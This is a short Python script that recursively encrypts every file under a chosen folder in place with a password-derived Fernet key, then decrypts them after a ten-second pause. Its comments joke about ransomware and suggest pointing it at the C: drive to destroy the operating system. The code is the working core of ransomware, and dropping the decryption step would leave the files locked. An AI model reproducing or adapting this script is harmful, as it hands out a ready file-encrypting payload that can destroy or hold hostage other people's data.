import time

from cryptography.fernet import Fernet, InvalidToken
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os
import base64

#DO NOT USE IT FOR RANSOMEWARE ATTACK :P
#THIS WILL ENCRYPT AND WAIT 10 SECONDS AND THEN DECRYPT ALL FILES, AND FILES CAN ONLY BE RETRIEVED WITH PASSWORD., BEWARE.. GIVE THE PATH AS C: AND DESTROY YOUR OPERATING SYSTEM
path = r"D:\TEST_FOLDER"


# Generate a key
password = b"password"
salt = os.urandom(16)
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
)
key = base64.urlsafe_b64encode(kdf.derive(password))
cipher_suite = Fernet(key)

# Encrypt all files in C drive
for root, dirs, files in os.walk(path):
    for file in files:
        try:
            with open(os.path.join(root, file), "rb") as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(os.path.join(root, file), "wb") as f:
                f.write(encrypted_data)
        except InvalidToken:
            print(f"File {file} is not a valid Fernet token")

print("encrypted files ")
time.sleep(10)
# Decrypt all files in C drive
for root, dirs, files in os.walk(path):
    for file in files:
        try:
            with open(os.path.join(root, file), "rb") as f:
                data = f.read()
            decrypted_data = cipher_suite.decrypt(data)
            with open(os.path.join(root, file), "wb") as f:
                f.write(decrypted_data)
        except InvalidToken:
            print(f"File {file} is not a valid Fernet token")

print("Decrypted files :) ")
